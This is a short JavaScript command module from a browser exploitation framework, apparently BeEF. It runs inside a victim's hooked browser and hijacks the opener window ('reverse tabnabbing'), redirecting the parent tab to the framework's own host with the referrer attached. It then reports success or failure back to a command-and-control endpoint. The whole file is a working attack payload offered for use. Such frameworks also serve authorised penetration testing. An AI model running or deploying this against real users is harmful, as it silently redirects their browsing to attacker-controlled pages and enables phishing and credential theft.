//
// Copyright (c) 2006-2025Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (Server) - https://serverproject.com
// See the file 'doc/COPYING' for copying permission
//

server.execute(function() {
  var referrer = document.referrer;
  try {
    server.debug("[Hijack Opener] Trying to hijack: " + referrer);
    window.opener.location = server.net.httpproto + '://' + server.net.host+ ':' + server.net.port + '/iframe#' + referrer;
    server.net.send("<%= @command_url %>", <%= @command_id %>, "success=hijacked window.opener.location", server.are.status_success());
  } catch (e) {
    server.debug("[Hijack Opener] could not hijack opener window: "+e.message)
    server.net.send("<%= @command_url %>", <%= @command_id %>, "fail=could not hijack opener window: " + e.message, server.are.status_error());
  }
});
